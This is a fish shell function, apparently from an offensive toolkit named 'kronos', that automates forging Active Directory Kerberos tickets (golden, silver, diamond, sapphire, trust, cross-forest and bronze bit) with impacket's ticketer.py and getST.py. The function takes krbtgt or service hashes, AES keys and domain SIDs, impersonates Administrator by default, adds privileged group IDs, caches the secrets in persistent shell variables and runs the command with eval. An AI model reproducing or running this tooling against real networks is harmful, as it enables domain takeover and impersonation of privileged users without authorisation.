# description: Create Golden, Silver, Diamond, Sapphire, Trust, Cross-Forest, and Bronze Tickets
function __kronos_ticket --description "Create advanced AD tickets using ticketer.py or getST.py"
    set -l ticket_types golden silver diamond sapphire trust cross-forest bronze
    
    argparse h/help u/user= d/domain= S/sid= H/hash= s/spn= I/user-id= G/groups= A/auth-user= P/auth-pass= L/auth-hash= K/aes-key= E/extra-sid= q/quiet X/edit-cmd -- $argv
    or return 1

    if set -q _flag_help
        echo "Usage: kronos ticket [subcommand] [OPTIONS]"
        echo ""
        echo "Create advanced AD tickets using impacket's ticketer.py or getST.py."
        echo ""
        echo "Subcommands: golden, silver, diamond, sapphire, trust, cross-forest, bronze"
        echo ""
        echo "Options:"
        echo "  -u, --user NAME      User to impersonate (default: Administrator)"
        echo "  -d, --domain NAME    Target domain name"
        echo "  -S, --sid SID        Domain SID"
        echo "  -H, --hash HASH      Target NTLM hash (krbtgt, service, etc.)"
        echo "  -s, --spn SPN        Target SPN (for silver/bronze tickets)"
        echo "  -A, --auth-user NAME Service/Low-priv account for request-based attacks"
        echo "  -q, --quiet          Skip prompts and use cached/default values"
        echo "  -X, --edit-cmd       Inspect and edit the command before execution"
        echo "  -h, --help           Show this help message"
        return 0
    end

    set -l subaction $argv[1]
    set -l wizard 0
    
    if test -z "$subaction"
        if not set -q _flag_quiet
            set subaction (__kronos_ask_choice "Pick a ticket type to forge" "golden" $ticket_types); or return 1
            set wizard 1
        else
            echo "error: subcommand required in quiet mode" >&2; return 1
        end
    else if contains -- "$subaction" $ticket_types
        if not set -q _flag_quiet; set wizard 1; end
        if test (count $argv) -gt 0; and test "$argv[1]" = "$subaction"; set -e argv[1]; end
    end

    # Capture flags
    set -l domain $_flag_domain
    set -l user $_flag_user
    set -l sid $_flag_sid
    set -l hash $_flag_hash
    set -l spn $_flag_spn
    set -l user_id $_flag_user_id
    set -l groups $_flag_groups
    set -l auth_user $_flag_auth_user
    set -l auth_pass $_flag_auth_pass
    set -l auth_hash $_flag_auth_hash
    set -l aes_key $_flag_aes_key
    set -l extra_sid $_flag_extra_sid

    if test "$wizard" -eq 1
        set_color cyan; echo "[*] Starting $subaction ticket wizard..."; set_color normal
        
        # 1. Hash (NTLM of krbtgt or Service)
        if test "$subaction" != "bronze" # Bronze uses Service Account credentials in a different way
            set -l hash_label "Target NTLM Hash"
            switch "$subaction"
                case golden cross-forest diamond sapphire; set hash_label "krbtgt NTLM Hash"
                case silver; set hash_label "Service NTLM Hash"
                case trust; set hash_label "Trust Account NTLM Hash"
            end
            set -l def_hash "$__KRONOS_CACHE_HASH"
            set -l src_hash "Cache"
            if test -z "$def_hash"; set def_hash "$TGT_PASSWORD"; set src_hash "TGT_PASSWORD"; end
            if test -n "$hash"; set def_hash "$hash"; set src_hash "CLI Arg"; end
            set hash (__kronos_ask "$hash_label" "$def_hash" "$src_hash"); or return 1
            set -U __KRONOS_CACHE_HASH "$hash"
        end

        # 2. AES
        if contains -- "$subaction" golden diamond sapphire cross-forest
            set -l def_aes "$__KRONOS_CACHE_AES_KEY"
            if test -n "$aes_key"; set def_aes "$aes_key"; end
            set aes_key (__kronos_ask "krbtgt AES256 Key" "$def_aes")
            set -U __KRONOS_CACHE_AES_KEY "$aes_key"
        end

        # 3. SID
        if test "$subaction" != "bronze"
            set -l def_sid "$__KRONOS_CACHE_SID"
            if test -n "$sid"; set def_sid "$sid"; end
            set sid (__kronos_ask "Domain SID" "$def_sid"); or return 1
            set -U __KRONOS_CACHE_SID "$sid"
        end

        # 4. Domain
        set -l def_domain "$__KRONOS_CACHE_DOMAIN"
        set -l src_domain "Cache"
        if test -z "$def_domain"
            set def_domain "$TGT_HOSTS[1]"; set src_domain "TGT_HOSTS"
            if test -z "$def_domain"; set def_domain "$TGT_DC_DOMAIN"; set src_domain "TGT_DC_DOMAIN"; end
        end
        if test -n "$domain"; set def_domain "$domain"; set src_domain "CLI Arg"; end
        set domain (__kronos_ask "Domain Name" "$def_domain" "$src_domain"); or return 1
        set -U __KRONOS_CACHE_DOMAIN "$domain"

        # 5. User (Impersonated)
        set -l user_prompt "User to Impersonate"
        if test "$subaction" = "sapphire"; set user_prompt "User to Impersonate (via S4U2Self)"; end
        set -l def_user "$__KRONOS_CACHE_USER"
        if test -z "$def_user"; set def_user "Administrator"; end
        if test -n "$user"; set def_user "$user"; end
        set user (__kronos_ask "$user_prompt" "$def_user"); or return 1
        set -U __KRONOS_CACHE_USER "$user"

        # 6. SPN (Silver/Bronze)
        if test "$subaction" = "silver" -o "$subaction" = "bronze" -o "$subaction" = "trust"
            set -l def_spn "$__KRONOS_CACHE_TICKET_SPN"
            if test -n "$spn"; set def_spn "$spn"; end
            set spn (__kronos_ask "Target SPN (e.g. cifs/srv01.domain.local)" "$def_spn"); or return 1
            set -U __KRONOS_CACHE_TICKET_SPN "$spn"
        end

        # 7. Auth Credentials (Diamond, Sapphire, Bronze)
        if contains -- "$subaction" diamond sapphire bronze
            set -l user_label "Auth Username"
            if test "$subaction" = "bronze"; set user_label "Service Account Username"; end
            
            set -l def_auth_user "$__KRONOS_CACHE_AUTH_USER"
            set -l src_user "Cache"
            if test -z "$def_auth_user"
                set def_auth_user "$TGT_USERNAME"; set src_user "TGT_USERNAME"
            end
            if test -n "$auth_user"; set def_auth_user "$auth_user"; set src_user "CLI Arg"; end
            set auth_user (__kronos_ask "$user_label" "$def_auth_user" "$src_user"); or return 1
            set -U __KRONOS_CACHE_AUTH_USER "$auth_user"

            set -l def_auth_val "$__KRONOS_CACHE_AUTH_VAL"
            set -l src_auth_val "Cache"
            if test -z "$def_auth_val"
                set def_auth_val "$TGT_PASSWORD"; set src_auth_val "TGT_PASSWORD"
            end
            if test -n "$auth_pass"; set def_auth_val "$auth_pass"; set src_auth_val "CLI Pass"; end
            if test -n "$auth_hash"; set def_auth_val "$auth_hash"; set src_auth_val "CLI Hash"; end
            set -l auth_input (__kronos_ask "Auth Password or Hash" "$def_auth_val" "$src_auth_val"); or return 1
            set -U __KRONOS_CACHE_AUTH_VAL "$auth_input"
            
            if string match -rq '^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$|^[a-fA-F0-9]{32}$' -- "$auth_input"
                set auth_hash "$auth_input"; set auth_pass ""
            else
                set auth_pass "$auth_input"; set auth_hash ""
            end
        end
    else
        # Fallbacks for non-wizard mode
        if test -z "$domain"
            set domain "$__KRONOS_CACHE_DOMAIN"
            if test -z "$domain"; set domain "$TGT_HOSTS[1]"; end
            if test -z "$domain"; set domain "$TGT_DC_DOMAIN"; end
        end
        if test -z "$user"; set user "Administrator"; end
    end

    set -l target "$TGT"
    if test -z "$target"; set target "$TGT_DC_IP"; end
    if test -z "$target"; set target "$TGT_DC"; end

    set -l final_cmd ""

    if test "$subaction" = "bronze"
        # Bronze Bit uses getST.py
        set -l impacket_cmd ""
        if command -v getST.py >/dev/null; set impacket_cmd getST.py
        else if command -v impacket-getST >/dev/null; set impacket_cmd impacket-getST
        else; echo "error: getST.py not found."; return 1; end

        set -l st_args -spn "$spn" -impersonate "$user" -bronzebit -dc-ip "$target"
        if test -n "$auth_hash"
            set -a st_args -hashes ":$auth_hash"
        else
            set -a st_args -password "$auth_pass"
        end
        set -a st_args "$domain/$auth_user"

        set final_cmd "$impacket_cmd "(string join ' ' -- $st_args)
    else
        # All others use ticketer.py
        set -l impacket_cmd ""
        if command -v ticketer.py >/dev/null; set impacket_cmd ticketer.py
        else if command -v impacket-ticketer >/dev/null; set impacket_cmd impacket-ticketer
        else; echo "error: ticketer not found."; return 1; end

        set -l ticket_args -nthash "$hash" -domain-sid "$sid" -domain "$domain"
        if test -n "$aes_key"; set -a ticket_args -aesKey "$aes_key"; end
        if test -n "$target"; set -a ticket_args -dc-ip "$target"; end

        set -l final_target_user "$user"
        switch "$subaction"
            case diamond
                set -a ticket_args -request -user "$domain/$auth_user"
                if test -n "$user_id"; set -a ticket_args -user-id "$user_id"; else; set -a ticket_args -user-id 500; end
                if test -n "$groups"; set -a ticket_args -groups "$groups"; else; set -a ticket_args -groups "512,513,518,519,520"; end
                if test -n "$auth_hash"; set -a ticket_args -hashes "$auth_hash" -password "";
                else; set -a ticket_args -password "$auth_pass"; end
            case sapphire
                set -a ticket_args -request -user "$auth_user" -user-id "$user_id" -impersonate "$user"
                if test -n "$auth_hash"; set -a ticket_args -hashes "$auth_hash" -password "";
                else; set -a ticket_args -password "$auth_pass"; end
                set final_target_user "baduser"
            case silver trust
                set -a ticket_args -spn "$spn"
            case cross-forest
                set -a ticket_args -extra-sid "$extra_sid"
        end
        set -a ticket_args "$final_target_user"
        set final_cmd "$impacket_cmd "(string join ' ' -- $ticket_args)
    end

    if set -q _flag_edit_cmd; set final_cmd (__kronos_edit_cmd "$final_cmd"); or return 1; end

    set -l bin (string split ' ' -- $final_cmd)[1]
    __kronos_check_dep $bin; or return 1
    
    echo "[*] Forging $subaction ticket via $bin..."
    eval $final_cmd
    
    # Export KRB5CCNAME if successful
    set -l forged_user "$user"
    if test "$subaction" = "sapphire"; set forged_user "baduser"; end
    
    if test -f "$forged_user.ccache"
        set -gx KRB5CCNAME "$PWD/$forged_user.ccache"
        echo "[+] Ticket saved and exported to KRB5CCNAME=$KRB5CCNAME"
    end
end
